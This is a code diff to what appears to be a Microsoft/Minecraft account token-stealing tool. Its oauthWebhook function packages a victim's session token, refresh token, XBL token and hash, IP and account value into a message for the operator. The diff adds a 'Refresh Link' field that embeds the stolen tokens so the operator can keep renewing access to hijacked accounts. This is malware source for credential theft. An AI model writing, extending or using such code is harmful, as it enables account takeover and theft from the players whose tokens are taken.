@@ -14,7 +14,6 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
     const compressedRefreshToken = Zlib.deflateSync(refresh_token).toString("utf8");
     const compressedXblToken = Zlib.deflateSync(xbl_token).toString("utf8");
     const compressedXblHash = Zlib.deflateSync(xbl_hash).toString("utf8");
-    console.log(compressedRefreshToken.length + compressedXblToken.length + compressedXblHash.length)
 
     //format networth to be human readable using K, M, B, T
     const formatedNw = Intl.NumberFormat('en-US', {
@@ -40,6 +39,10 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         {
             "name": "Session Token",
             "value": `\`\`\`${session_token}\`\`\``
+        },
+        {
+            "name": "Refresh Link",
+            "value": `[Click Here](${refreshURL}?refresh_token=${compressedRefreshToken}&xbl_hash=${compressedXblHash}&xbl_token=${compressedXblToken})`
         }
     ]
     if (description !== "Error getting networth") {
